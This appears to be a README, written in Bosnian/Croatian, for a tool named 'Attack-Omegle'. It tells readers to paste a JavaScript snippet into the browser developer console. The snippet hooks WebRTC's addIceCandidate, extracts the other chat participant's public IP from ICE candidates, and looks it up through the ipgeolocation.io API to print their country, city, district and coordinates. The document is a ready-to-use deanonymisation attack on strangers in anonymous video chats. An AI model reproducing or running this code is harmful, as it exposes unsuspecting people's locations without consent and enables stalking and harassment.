# Attack-Omegle
Ima te u cosku na desnoj strani browzera 3 tackice koje idu ovako:" ... " i vi kliknite na te tackice pa idite na vise alata i alati za razvoj inzenjera.
Takoder prije toga morate u ovaj kod unjeti kljuc koji ce te dobiti na: https://app.ipgeolocation.io/
Code:
const apiKey = "OVDJE NAPISATI TVOJ API KLJUC";

window.oRTCPeerConnection =
window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
const pc = new window.oRTCPeerConnection(...args);

pc.oaddIceCandidate = pc.addIceCandidate;

pc.addIceCandidate = function (iceCandidate, ...rest) {
const fields = iceCandidate.candidate.split(" ");

const ip = fields[4];

if (fields[7] === "srflx") getLocation(ip);

return pc.oaddIceCandidate(iceCandidate, ...rest);
};

return pc;
};

const getLocation = async (ip) => {
let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
await fetch(url).then((response) =>
response.json().then((json) => {
const {
city,
district,
state_prov,
country_name,
latitude,
longitude,
} = json;
const output = `
---------------------
Country: ${country_name}
State: ${state_prov}
City: ${city}
District: ${district}
Lat / Long: (${latitude}, ${longitude})
IP: ${ip}
---------------------
`;
console.log(output);
})
);
};
